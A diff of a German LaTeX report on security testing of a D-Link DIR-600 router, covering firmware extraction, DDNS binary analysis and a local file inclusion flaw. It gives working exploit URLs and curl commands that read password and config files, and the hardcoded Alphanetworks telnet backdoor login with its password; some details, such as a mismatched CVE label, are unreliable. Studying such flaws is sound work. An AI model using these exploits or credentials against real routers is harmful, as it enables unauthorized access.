@@ -554,10 +554,12 @@
 	\chapter{Tests D-Link DIR-600}
 	\label{sec:Tests D-Link DIR-600}
 	%-------------TEST die alle NICHT funktioniert haben---------------------%
-	D-Link DIR-600 Router
-	Ziel: Zugang zum Router um Schwachstellen zu testen
-	Umgebung: BS Kali Linux, Verbunden über Ethernet
-	Router IP: 192.168.0.1 (bestätigt durch ping und ip route)
+	Ziel der Untersuchung war es, potenzielle Sicherheitslücken zu identifizieren und zu testen.
+	Die Analyse wurde unter Kali Linux durchgeführt, wobei der Router sowohl über Ethernet als auch
+	über das Wireless Lokal Area Networke (WLAN) verbunden war.
+	Die IP Adresse des Gerätes (192.168.0.1) wurde mittels \texttt{ping} sowie \texttt{ip route}
+	verifiziert.
+	
 	Grundtest:
 	\begin{table}[h]
 		\hypertarget{tabelle1}{}
@@ -571,35 +573,19 @@
 		\caption{Testtabelle}
 	\end{table}
 
-	Es wurden folgende User und Passwörter getestet (alles schlug Fehl):
-	admin:(blank) -> Standart passwort das zu beginn gesetzt ist
-	admin:admin
-	Alphanetworks:Alphanetworks (known backdoor)
-	dlink:dlink
-	user:user
-	support:support
-	root:admin
+	Es wurden verschiedene Zugangsdaten getestet, jedoch ohne Erfolg. nach einem Factory Reset
+	durch Gedrückthalten der Reset-Taste für etwa 15 Sekunden wurden die Zugangsdaten auf die
+	Werkseinstellungen zurückgesetzt. Anschließend war ein Login mit dem Standartbenutzter
+	\tetxttt{admin} und einem leeren Passwort möglich.
 
-	Router wurde reseted, durch langes drücken des Reset Knopfs.
-	Nutzer und Passwort wurden zurückgesetzt.
-	Nutzer: admin
-	Passwort: (blank)
-	Einloggen hat geklappt, Zugriff auf die Adminseite.
+	\section{Firmware-Analyse}
 
-	Da das Einloggen mithilfe des Standardpasswort nicht Funktioniert hat wurde der Rooter reseted
-	durch drücken der Reset Taste für 15 Sekunden.
-	Durch das reseten wurden alle vorgenommenen einstellungen des Routers zurückgesetzet eingenommen des Passworts.
-	Nun konnte die Einstellungen des Routers betretenmit Folgenden Passowrt:
-	Nutzer: admin
-	Passwort: (blank)
+	Zur Analyse der Firmware wurde das Tool \texttt{binwalk} eingesetzt:
 
-	\subsection{Exploit Testing}
-	Binwalk
-	Befehl:
 	\begin{lstlisting}
 	binwalk DIR600B_FW205b01.bin 
 	
-	ECIMAL       HEXADECIMAL     DESCRIPTION
+	DECIMAL       HEXADECIMAL     DESCRIPTION
 	------------------------------------------------------------
 	48            0x30           Unix path: /dev/mtdblock/2
 	96            0x60           uImage header, header size: 64 bytes,
@@ -611,9 +597,10 @@
 	160           0xA0           LZMA compressed data
 	917600        0xE0060        Squashfs filesystem
 	\end{lstlisting}
-	In Zeile 1 steht das sogennante String-Fund im Binary,also kein echtes dateisystemobject.
-	/dev/mtdblock/2 ist die Flash-Speicher-Partition. Das bedeutet, die Firmware ist für den Flash-Speiche gebaut.
-	Der uImage header in Zeile 2 ist ein von U-Boot verwendetes Kernel-Format, welhces aus einem Header (Metadaten) un dem Kernel besteht.
+	
+	Der uImage Header enhält unter anderem Informationen zur CPU (MSI), zur Ladeadresse im RAM sowie zum Einstiegspunkt
+	des Kernels. Das verwendete Linux-System basiert auf einem Kerne der Version 2.6x, was auf ein
+	veraltetes System hindeutet.
 
 	\begin{table}[h]
 		\centering
@@ -636,192 +623,52 @@
 		\caption{Inside The uImage}
 	\end{table}
 	
-	Das Linux Kernel hat die Version OS Kernel Image, MIPS, Linux 2.6.x, das ist eine sehr alte Kernel-Version von 2010
-	und hat eine MIPS-Architektur (Embedded Router Standard). 
-
-	In LZMA compressed data sthet der eigentliche Kernel Code, komprimiert LZMA.
+	In LZMA compressed data steht der eigentliche Kernel Code, komprimiert LZMA.
 	dictionary size: 32MB bestimmt das Kompressionsfenster und ist typisch für Embedded Linux Kernel.
 	uncompressed size ~ 2.9MB ist die reale Kernelgröße nach dem Entpacken.
 
 	PackImg section delimiter tag Das ist ein marker für den Begin einer weiteren Firmware-Section. 
 
-	SquashFS ist ein komprimiertes readonly Linux Dateisystem der version 3.0. Es hat 1065 inodes, also ein sehr kleines System.
-	Hier steht das gesamte Linux-System des Routers.
-
-	Befehl:
-
+	SquashFS ist ein komprimiertes, nur lesbares Linux Dateisystem der version 3.0.
+	Durch Ausführen von:
 	\begin{lstlisting}
 		binwalk -e DIR600B_FW205b01.bin 
 	\end{lstlisting}
-	Der Befehl entpackt die Förmwear.
-	In squashfs-root/www/ liegt das Webinterface, verteilt auf eine Vielzahl von Ordner. Um den Rahmen der Arbeit nicht zu sprengen
-	wird im folgendne nur auf die wesentlichen bestandteile der Datei eingegangen.
+	wurde die Förmwear extrahiert und das Dateisystem zugänglich gemacht.
+	
+	\subsection{Schwachstelle}
 
-	squashfs-root/www/model/\_\_show\_info.php
-	Die Datei ist ein generischer Content-Renderer für das Webinterface. Sie kann zum einen Standartanzeigen machen und
+	In squashfs-root/www/ liegt die implementierung des Webinterface, verteilt auf eine Vielzahl von Ordner. 
+	squashfs-root/www/model/\_\_show\_info.php, ist besonders relevant.
+	Die Datei ist ein generischer Content-Renderer für das Webinterface. 
+	Sie kann zum einen Standartanzeigen machen und
 	Dynamische Includes machen. 
-	Folgende stelle ist kritisch:
+	Sie enthält folgenden Code:
 	\begin{lstlisting}
 		if($REQUIRE_FILE!="")
 		{
 			require($LOCALE_PATH."/".$REQUIRE_FILE);
 		}
 	\end{lstlisting}
-	
-	Zeile sowiso lädt hierbei eine externe Datei in die Seite.
-	Der Entwickler wollte damit vermutlich bezwecken, das zb mehrer Sprachen auf die Seite geladen werdern können.
-	REQUIRE\_FILE kommt indirekt aus der URL, also vom Nutzter selbst. Der Pfad wird dann eine Zeile weiter unten Zusammengesetzt.
-	Beispielsweise: \texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}. Später wird dann einfach
-	\texttt{require(...)} ausgeführt. PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird dann eingebunden und der Inhalt wird sichtbar.
-	
-	Im folgenden wird noch etwas tiefer in die Architecktur des Routers eingestiegen.
-	Ziel der Untersuchung war es die interne Funktionsweise des Routers, sowie potenzielle sicherheitsrelevamte Aspekte 
-	der implementierung nachvollziebar darzustellen.
-	Im Fokus stand die rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
-	sowie eine anschließenden Bewertung.
 
-	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architecktur für eingebettete Linux-Systeme.
-	Die DDNS-Funktionalität ist nicht als externe Bibliothek implementiert, sondern als eigenständiges Binärprogramm.
-	Dieses Programm verarbeitet zunächst Kommandozeilenparameter und liest anschließend Konfigurationsdaten aus einer
-	internen Konfigurationsdatenbank (xmldbc). Zu den relevanten Parametern gehören unter anderem der gewählte DDNS-Service,
-	der Hostname, die Ziel-IP-Adresse sowie Authentifizierungsdaten wie benutzername und Passwort.
-	
-	Der Dienst wird nicht direkt gestartet sondern über ein generiertes Shell-Skript:
-	\begin{lstlisting}
-		# dyndns.sh
-		rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
-		sh /var/run/dyndns.sh > /dev/console
-	\end{lstlisting}
-	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
-	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welche DDNS-Client
-	gestartet wird.
-	\begin{lstlisting}
-		if ($USER!="" && $PASS!="")
-		{
-			echo "echo Start dyndns #".$provider."... > /dev/console\n";
-			echo "echo dyndns > ".$progfile."\n";
-			echo "dyndns -S \"".$provider;
-			echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
-			echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
-			echo " -q \"/var/run/dyndns.info\"";
-			if ($HOST!="") { echo " -n \"".$HOST."\""; }
-			echo " > /dev/console &\n";
-		}
-	\end{lstlisting}
-	Es wird zur Laufzeit ein Systembefehl generiert der dem nativen DDNS-Deamon mit Parameter aus der Konfigurationsdatei startet.
-
-	Die zentrale Konfigurationsquelle ist xmldbc. Zugangsdaten und Zielhost werden ohne validierung übernommen, die Laufzeit-IP wird direkt aus dem WAN-Interface gelesen. 
-	\begin{lstlisting}
-		if ($USER!="" && $PASS!="")
-		{
-			echo "echo Start dyndns #".$provider."... > /dev/console\n";
-			echo "echo dyndns > ".$progfile."\n";
-			echo "dyndns -S \"".$provider;
-			echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
-			echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
-			echo " -q \"/var/run/dyndns.info\"";
-			if ($HOST!="") { echo " -n \"".$HOST."\""; }
-			echo " > /dev/console &\n";
-		}
-	\end{lstlisting}
-
-	Im Binary /usr/bin/dyndns welches mithilfe von Ghira genauer analysiert wurde, werden folgende Kommandozeilenargumente übernommen:
-	\begin{lstlisting}
-		case 0x6e:  // -n
-			pcRam1000027c = optarg;   // hostname
-		case 0x70:  // -p
-			DAT_10000288 = optarg;    // password
-		case 0x69:  // -i
-			DAT_10000280 = optarg;    // IP address
-		case 0x53: // -S
-  			DAT_10000274 = atoi(optarg);  // provider ID
-	\end{lstlisting}
-	Alle sicherheitsrelevanten Parameter also Provider, Credentials, Zielhost und IP stammen direkt aus einer
-	untrusted configuration ohne zusätzliche Validierungsschicht.
-
-	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
-	verwendet wird. Hierfür gibt es intern eine Tabelle die jedem Service-Namen eine numerische Identifikation zuordnet.
-	Falls die Parameter ungültig oder unvollständig sind wird das Programm abgebrochen.
-
-	Nach der Konfigurationsphase kommt die Netzwerklogik. Das Programm arbeitet mit verschieden Zuständen,
-	\begin{lstlisting}
-		iVar2 = select(uVar7 + 1,
-               (fd_set *)local_288,
-               (fd_set *)__writefds,
-               (fd_set *)0x0,
-               &local_290);
-	\end{lstlisting}
-	Der Zustand wird über uVar7 + 1 = uVar8 gesteuert:
-	0 = disconnected
-	1 = connecting
-	2 = connected/update running
-	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
-	Dabei werden klassische BSD-Socket-Funktioenen verwendet, insbesondere socket() und connect(),
-	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
-	
-	Die Auswahl des DDNS-Anbieter bestimmt dabei den Aufbau der HTTP-Anfrage. Die Firmware unterstützt mehrere Anbieter
-	(z.B. DynDNS, No-IP, usw), wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
-	Beispiel DynDNS.org
-	\begin{lstlisting}
-		snprintf(acStack_260,500,
-            "GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
-			 Authorization: Basic %s\r\n
-			 User-Agent: %s\r\n
-			 Host: %s\r\n\r\n",
-             uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
-	\end{lstlisting}
-	Die HTTP-Requests werden manuell zusammengestezt und direkt über eine Socket-Verbindung versendet.
-	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Username und Passwort
-	verlangt, welche Base64 Codiert in den HTTP-Header integriert werden (siehe oben).
-	\texttt{base64encode(pcVar4,sVar3,&uStack_28);}
-
-	Außerdem enthält die main-loop einen vergleich der einen Runtime-Wert mit gespeicherten Konfigurationswerten
-	vergleicht:
-	\begin{lstlisting}
-		if ((uptime != 0) &&
-    		(provider == runtime_provider) &&
-    		(strcmp(ipaddr, runtime_ip) == 0))
-		{
-    		sysinfo(&local_188);
-    		iVar2 = local_188.uptime - iVar2;
-		}
-	\end{lstlisting}
-	Die Implementierung weist einige sicherheitskritischen Schwächen auf, die für ältere Embedded-Systeme typisch sind.
-	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation ist kritisch. Sämtliche DDNS-Anfragen erfolgen
-	über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netztwerk übertragen werden können.
-	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Anbgreifen von Zugangsdaten.
-
-	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierunginformationen werden global abgelegt und mehrfach
-	in unterschiedlichen Verarbeitungsschritten verwendet. Obwohl keine klassischen Speicherfehler wie Buffer-Overflows
-	oder Format-Strings im untersuchten Codeabschnitt sichbar sind, bleibt durch due unsauberen Datenflüsse und
-	die fehlende strikte Validierung ein erhötes Sicherheitsrisiko.
-
-
-	CVE-2017-17215 (HNAP Auth Bypass):
-	Laut dem CVE Verzeichniss hat der Router eine Schwachstelle in der Login Page.
-	Bei dieser wird an die URL http://192.168.0.1 folgender String angehängt:
-	/model/\_\_show\_info.php?REQUIRE\_FILE=%2Fvar%2Fetc%2Fhttpasswd
-	Das ist URL Entschlüsselt REQUIRE\_FILE=/var/etc/httpasswd
-
+	Hierbei wird der Parameter \texttt{REQUIRE_FILE} ohne Validierung in einen Dateipfand eingebunden
+	und anschließend mittels \texttt{require()} eingebunden. Da dieser parameter direkt durch den
+	Nutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
+	Durch das verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
+	mittels Pfadangaben in der Url, können unteranderem sensible Daten eingesehen werden.
+	Beispielsweise folgende anfrage: \texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}.
+	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.
 	\begin{figure}[H]
 		\centering
 		\includegraphics[width=\textwidth]{img/Passwort.png}
 		\caption{Seite nach Exploit}
 		\label{fig: Hallo}
 	\end{figure}
+	Die Datei /var/etc/httpasswd ennthält für den aktuellen Benutztername und das Passowrt,
+	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei gespeichert wird.
+	Dies ermöglicht die Umgehung der Authentifizierung.
 
-	So kann anschließend der aktuelle Username so wie das Passwort des Routers ausgelesen werden.
-	Offenbar verarbeitet show\_info.php den Parameter REQUIRE\_FILE folgendermaßen:
-	\begin{lstlisting}
-		required(\$_GET['REQUIRED_FILE']);
-	\end{lstlisting}
-	required() lädt beliebige Dateien aus dem Datei System, ohne Validierung oder Einschränkung.
-	Der Benutzter selbst kontrolliert direkt welche Dateien geladen werden.
-	Die Datei /var/etc/passwd enbthält für gewöhnlich Benutztername und Passowrt,
-	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei stehen.
-	Da die Login Seite hier komplett umgeangen wird von Authentication Bypass gesprochen.
-
-	Mit folgendem Skript wurden weitere befehle automatisisert getestet.
+	Ein automatisisertes Testskript wurde verwendet um verschiedene Dateisysteme abzurufen.
 	\begin{lstlisting}
 	#!/bin/bash
 
@@ -870,27 +717,21 @@
 
 	exit
 	\end{lstlisting}
+	Das Skript arbeitet die einzelnen Pfade nacheinander ab. Der Befehl curl überträgt Daten zwischen dem Rechner
+	und einem Server. Mit -H lassen sich HTTP-Header setzten. Zudem wurde das Paket jp installiert, so kann die Eingabe automatisch
+	entsprechend der URL-Vorgaben formatiert werden.
 
-	Der Befehl curl kann aus der Seite selbst herasukopiert werden, so kann sichhergestellt werden, das alle
-	Umgebungsvariablen passen. Zudem wurde das Paket jp installiert, so kann die Eingabe automatisch
-	richtig formatiert werden.
-
-	Durch /var/etc/httpasswd hat ein Angreifer vollen Zugriff auf das Webinterface und kann beliebige
-	Einstellungen am Router vornehmen, wie den DNS Server ändern um den Traffic umzuleiten, das Firmware-Update
-	manipulieren oder Remote Access aktivieren.
-	Mit /proc/version und /proc/cpuinfo lässt sich die Kernel Version und die Architecktur auslesen.
-	Diese Informationen können einem Angreifer dabei helfen die Richtigen Exploits sowie die Firmware-Reverse zu Engeneeren.
-	/proc/self/environ zeigt die Laufzeitumgebung. Der Webserver läuft bei diesem Router unter root was sehr kritisch ist.
-	Die Datei \/var\/log\/messages enthält DHCP-Leases, die interne Netztwekstruktur, sowie die geräte MAC's. Dies kann nützlich sein,
-	für Netztwerk-Mapping und weitere Angriffe übers LAN.
-	Die Datei /etc/hosts bestätigt lediglich den Hostname und die Interne Struktur, ist aber weiter nicht kritisch.
 	
-	Der Befehl /proc/self/cmdline zeigt folgenden Output:
-	\texttt{xmldb-nwrgn23_dlwbr_dir600b-t}
-	Das ist die CommandLine des Prozesses der die Webanfrage verarbeitet. Oft ist das ein Properitärer Dienst,
-	bei D-Link xmldb. Das ist der Konfigurations-/Datenbank Deamon des Routers.
-	nwrgn23\_dlwbr\_dir600b-t ist das Interne Modell bzw das Förmwaer Profil.
-	Daraus lässt sich herleiten, das das Webinterface eingebettet ist ind mit einem eigenen CGI-/Binnary Handler läuft.
+	\begin{itemize}
+	\item \texttt{/var/etc/httpasswd} – enthält Zugangsdaten für das Webinterface
+	\item \texttt{/var/log/messages} – enthält Logdaten und Netzwerkaktivität
+	\item \texttt{/proc/self/cmdline} – enthält informationen zur CommandLine des Prozesses
+	\item \texttt{/proc/self/environ} – zeigt Umgebungsvariablen des Prozesses
+	\item \texttt{/proc/mounts} – zeigt Umgebungsvariablen des Prozesses
+	\item \texttt{/proc/version} – liefert Kernel-Informationen
+	\item \texttt{/proc/cpuinfo} – enthält Informationen zur Hardwarearchitektur
+	\item \texttt{/etc/hosts} – enthält den Hostnamen und die interne Struktur
+	\end{itemize}
 	
 	Der Befehl /proc/mounts hat den Output:
 	\begin{lstlisting}
@@ -907,6 +748,144 @@
 	Zeile 4 zeigt das Hardware und Kernel Interface. Es enthhält Geräteinfos und Treiberstatus, liefert allerdings wenig sicherheitskritische Informationen.
 	Zudem wird durch die Ausgabe deutlich, das /var im RAM liegt, siehe Zeile 5. Alle Daten die dort liegen, werden zur
 	Laufzeit generiert. Das erklärt wieso sich die Logdatei und die Passwörtzer auslesen lassen, da diese im /var Verzeichniss liegen.
+
+	\subsection{Analyse der Systemarchitektur}
+
+	Ziel der Untersuchung war es die interne Funktionsweise des Routers, sowie potenzielle sicherheitsrelevamte Aspekte 
+	der implementierung nachvollziebar darzustellen.
+	Im Fokus stand die rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
+	sowie eine anschließenden Bewertung.
+
+	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architecktur für eingebettete Linux-Systeme.
+	Konfigurationsdaaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
+	Das Dynamic Domain Name System auch DDNS gennant, ist hier nicht als externe Bibliothek implementiert, sondern als seperates Binärprogramm.
+	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
+	\begin{lstlisting}
+		# dyndns.sh
+		rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
+		sh /var/run/dyndns.sh > /dev/console
+	\end{lstlisting}
+	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
+	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
+	gestartet wird.
+	
+	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
+	\begin{lstlisting}
+	if ($USER!="" && $PASS!="")
+	{
+		echo "echo Start dyndns #".$provider."... > /dev/console\n";
+		echo "echo dyndns > ".$progfile."\n";
+		echo "dyndns -S \"".$provider;
+		echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
+		echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
+		echo " -q \"/var/run/dyndns.info\"";
+		if ($HOST!="") { echo " -n \"".$HOST."\""; }
+		echo " > /dev/console &\n";
+	}
+	\end{lstlisting}
+	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
+	Auffällig ist, das sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
+	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
+	dieser Eingabe findet nicht statt. Dies stellt einen kritischen Punkt dar, da es sich dabei
+	um potenziell manipulierte Daten handel könnte.
+
+	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghira genauer analysiert 
+	Es zeigt das die Kommandozeilenargumente direkt verarbeitet werden:
+	\begin{lstlisting}
+	case 0x6e:  // -n
+		pcRam1000027c = optarg;   // hostname
+	case 0x70:  // -p
+		DAT_10000288 = optarg;    // password
+	case 0x69:  // -i
+		DAT_10000280 = optarg;    // IP address
+	case 0x53: // -S
+		DAT_10000274 = atoi(optarg);  // provider ID
+	\end{lstlisting}
+	
+	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
+	verwendet wird. Hierfür wird eine intern Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
+	Falls die Parameter ungültig oder unvollständig führt dies zum Programm abbruch.
+
+	Nach der Konfigurationsphase folt die Netzwerklogik.
+	Das Programm arbeitet mit zustandbasierter Logik über \texttt{select()}:
+	\begin{lstlisting}
+	iVar2 = select(uVar7 + 1,
+			(fd_set *)local_288,
+			(fd_set *)__writefds,
+			(fd_set *)0x0,
+			&local_290);
+	\end{lstlisting}
+	Interpretation der Zustände:
+	0 = disconnected
+	1 = connecting
+	2 = connected/update running
+	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
+	Dabei werden klassische BSD-Socket-Funktioenen wie \texttt{socket()} und \texttt{connect()},
+	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
+	
+	Die Auswahl des DDNS-Anbieter bestimmt dabei den Aufbau der HTTP-Anfrage. 
+	Die Firmware unterstützt mehrere Anbieter(z.B. DynDNS, No-IP, usw), wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
+	Beispiel DynDNS.org
+	\begin{lstlisting}
+	snprintf(acStack_260,500,
+		"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
+			Authorization: Basic %s\r\n
+			User-Agent: %s\r\n
+			Host: %s\r\n\r\n",
+			uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
+	\end{lstlisting}
+	Die HTTP-Requests werden manuell zusammengestezt und direkt über eine Socket-Verbindung versendet.
+	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Username und Passwort
+	verlangt, welche Base64 Codiert in den HTTP-Header integriert werden (siehe oben).
+	\texttt{base64encode(pcVar4,sVar3,&uStack_28);}
+
+	Die Implementierung weist einige sicherheitskritischen Schwächen auf, die für ältere Embedded-Systeme typisch sind.
+	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation ist kritisch. Sämtliche DDNS-Anfragen erfolgen
+	über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netztwerk übertragen werden können.
+	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Anbgreifen von Zugangsdaten.
+
+	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierunginformationen werden global abgelegt und mehrfach
+	in unterschiedlichen Verarbeitungsschritten verwendet. Obwohl keine klassischen Speicherfehler wie Buffer-Overflows
+	oder Format-Strings im untersuchten Codeabschnitt sichbar sind, bleibt durch due unsauberen Datenflüsse und
+	die fehlende strikte Validierung ein erhötes Sicherheitsrisiko.
+
+	\subsection{Telnet Connection}
+	Der Computer ist mit dem Router übder das Ethernet Kanbel verbunden.
+	tenlent 192.169.0.1
+	Alphanetworks ist laut meherer Quellen der Standart nutzer für den Router
+	Passwort musste über den binwalk herausgefunden werden
+
+	strings DIR600B_FW205b01.bin | grep -i -E "password|admin|alphanetworks|root|login"
+	telnetd -l "/usr/sbin/login" -u Alphanetworks:$image_sign -i $lf &
+
+	grep -r "image_sign" squashfs-root/
+	cat squashfs-root/etc/scripts/misc/telnetd.sh
+	cat squashfs-root/etc/config/image_sign
+	ls -la squashfs-root/etc/config/
+	curl -v -u "admin:cyber" "http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/etc/config/image_sign" \
+  	-H "User-Agent: Mozilla/5.0"
+
+	curl -v -u "admin:cyber" "http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/var/config.bin" \
+   -H "User-Agent: Mozilla/5.0" --output config.bin
+
+	strings config.bin | grep -i "image_sign\|password\|Alphanetworks"
+
+	\begin{lstlisting}
+	Trying 192.168.0.1...
+	Connected to 192.168.0.1.
+	Escape character is '^]'.
+	login: Alphanetworks
+	Password: wrgn23_dlwbr_dir600b
+	\end{lstlisting}
+
+	% --------------ToDo--------------------%
+	% Formatierung schön machen 
+	% Bilder einfügen
+	% Telnet voll fertig schreiben
+	% WIRESHARK wichtig
+	% Passwort testing auf der Webseite
+	% Quellen korrekt einfügen auch im Text
+	% --------------------------------------%
 
 	%=======================notes jf - need to be deleted later
 	%testen was passiert wenn Router auf Werkseinstellungen ist
